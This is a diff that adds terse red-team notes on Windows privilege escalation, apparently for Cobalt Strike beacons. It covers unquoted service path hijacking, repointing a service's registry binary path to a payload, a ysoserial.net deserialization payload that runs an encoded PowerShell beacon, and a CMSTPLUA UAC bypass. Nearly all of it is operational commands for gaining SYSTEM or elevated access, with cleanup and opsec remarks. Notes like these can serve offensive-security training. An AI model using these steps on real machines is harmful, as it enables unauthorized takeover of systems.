@@ -1,0 +1,57 @@
+Privilege Escalation: Tactic TA0004 
+
+Unquoted Service Path
+
+sc_qc service_name <-- query service for binary path
+cacls :c:\path_found above" <-- check perms hope for CI, OI, F
+cd to path_found
+upload pay load make sure it is a dedicated svc (dns_x64.svc.exe)
+mv dns_x64.svc.exe to service.exe (due to unquotted paths C:\Program Files\Bad Windows Service\Service would look for service.exe cause of service space)
+sc_stop service_name
+sc_start service_name
+checkin to get details from beacon
+
+------------------------------------------------------------------------
+
+Service Registry Permissions
+
+powerpick Get-Acl -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\name_of_service' | fl'
+look for access that fits your current role like: NT AUTHORITY\Authenticated Users Allow  FullControl
+sc_stop service_name
+cd c:\temp (bad opsec ?)
+upload  C:\Payloads\dns_x64.svc.exe
+sc_qc service_name <- get currentbinary path (save path to restore later)
+sc_config service_name c:\temp\dns_x64.svc.exe 0 2 <- reconfigure to point to your binary payload, overwrites binary path
+sc_qc service_name  (validate it worked)
+sc_start service_name
+
+clean up
+sc_config service_name original_path 0 2
+delete payload 
+------------------------------------------------------------------------
+
+Unsafe Deserialization
+
+Right click medium-integrity beacon choose add one liner DNS Beacon Payload
+Copy the command it gives you, you need the encoded portion
+Local machine run: C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc ENTER_ENCODED_HERE" -o raw --outputpath=C:\Payloads\data.bin
+cd c:\temp (what opsec)
+upload your payrol from yoserial
+sc_start service_name or make sure it is running if runnign wait a few moments. 
+
+------------------------------------------------------------------------
+
+CMSTPLUA UAC Bypass
+to work process beacon is running as must be in windows
+spawn x64 http <-- starts beacon in windows directory
+host powershell one liner and chose tcp-local for listener.
+runasadmin uac-cmstplua powershell one liner from above
+connect to elevated beacon
+connect localhost and port ex. connect localhost 1337
+
+
+
+
+
+
+
